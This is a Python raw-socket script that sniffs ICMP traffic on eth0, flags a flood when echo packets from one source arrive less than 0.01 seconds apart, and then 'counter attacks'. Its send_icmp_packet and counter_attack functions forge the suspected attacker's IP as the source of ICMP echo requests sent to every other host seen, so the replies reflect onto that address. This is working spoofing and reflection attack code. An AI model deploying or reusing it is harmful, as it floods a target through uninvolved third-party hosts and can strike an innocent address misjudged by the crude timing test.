import socket, sys
import struct
import datetime

ETH_P_ALL = 0x0003
KNOWN_HOSTS = {}
THRESHOLD = datetime.timedelta(seconds=0.01)
print('Threshold: ' + str(THRESHOLD))


def bytes_to_mac(bytesmac):
    return ':'.join('{:02x}'.format(x) for x in bytesmac)


def checksum(msg):
    s = 0
    msg = (msg + b'\x00') if len(msg)%2 else msg
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
        s = (s & 0xffff) + (s >> 16)
    s = ~s & 0xffff
    return socket.ntohs(s)


def pack_ip_header(s_ip_addr, d_ip_addr):
    # Header IP
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0
    ip_saddr = socket.inet_aton(s_ip_addr)
    ip_daddr = socket.inet_aton(d_ip_addr)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
        ip_proto, ip_check, ip_saddr, ip_daddr)
    
    return ip_header


def pack_icmp_packet():
    # ICMP Echo Request Header
    type = 8
    code = 0
    mychecksum = 0x00
    identifier = 12345
    seqnumber = 0
    payload = b'thisisaiptest'
    icmp_packet = struct.pack('!BBHHH%ds'%len(payload), type, code, mychecksum, identifier, seqnumber, payload)
    mychecksum = checksum(icmp_packet)
    icmp_packet = struct.pack('!BBHHH%ds'%len(payload), type, code, mychecksum, identifier, seqnumber, payload)

    return icmp_packet


def send_icmp_packet(s_ip_addr, d_ip_addr):
    try:
        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)

    print('Sending ICMP src: %s dst: %s' % (s_ip_addr, d_ip_addr))

    # Include IP header
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ip_header = pack_ip_header(s_ip_addr, d_ip_addr)
    icmp_packet = pack_icmp_packet()
    dest_addr = socket.gethostbyname(d_ip_addr)
    icmp_socket.sendto(ip_header+icmp_packet, (dest_addr, 0))


def process_ip_packet(eth_length, eth, my_mac_addr):
    ip_header = packet[eth_length:20+eth_length]
    iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
    protocol = iph[6]
    is_icmp = protocol == socket.getprotobyname('icmp')
    is_mac_src_mine = eth[1] == my_mac_addr

    if is_icmp and not is_mac_src_mine:
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])

        print('ICMP IP src: ' + s_addr)

        process_icmp_packet(eth, s_addr, d_addr)


def process_icmp_packet(eth, s_addr, d_addr):
    now = datetime.datetime.utcnow()
    
    if s_addr in KNOWN_HOSTS:
        last_time = KNOWN_HOSTS[s_addr]
        time_diff = now - last_time

        if time_diff < THRESHOLD:
            print('Attack Detected!')
            print('Flood interval: ' + str(time_diff))
            print('Counter attacking...')
            counter_attack(s_addr)

    KNOWN_HOSTS[s_addr] = now


def counter_attack(s_addr):
    other_ips = [ip for ip in KNOWN_HOSTS.keys() if ip != s_addr]

    for ip in other_ips:
        send_icmp_packet(s_addr, ip)


if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)

    print('Socket created!')

    s.bind(('eth0', 0))

    sockname = s.getsockname()
    my_mac_addr = sockname[-1]

    print('MAC address: ' + bytes_to_mac(my_mac_addr))

    while True:
        (packet, addr) = s.recvfrom(65536)

        eth_length = 14
        eth_header = packet[:14]

        eth = struct.unpack('!6s6sH', eth_header)

        if eth[2] == 0x0800:
            process_ip_packet(eth_length, eth, my_mac_addr)
